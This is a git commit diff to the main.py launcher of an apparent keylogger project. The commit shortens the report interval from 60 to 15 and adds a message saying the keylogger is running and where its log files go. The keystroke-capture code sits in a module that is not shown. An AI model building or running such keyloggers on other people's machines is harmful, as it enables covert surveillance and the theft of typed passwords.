bfd26134f2365aa91104f3ec188c1730b7fa3e62
Ok6c <107810809+ThinkingCheese@users.noreply.github.com>
2022-09-10 10:36:49 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,6 @@
 import log
 
 if __name__ == "__main__":
-    keylog = log.Keylog(60) # the rate of which to create a report (txt file into the current directory)
+    keylog = log.Keylog(15) # the rate of which to create a report (txt file into the current directory)
+    print("KEYLOGGER IS NOW RUNNING, view your documents Directory > Keylog Files to view your keylogs.")
     keylog.start() # starting the keylog
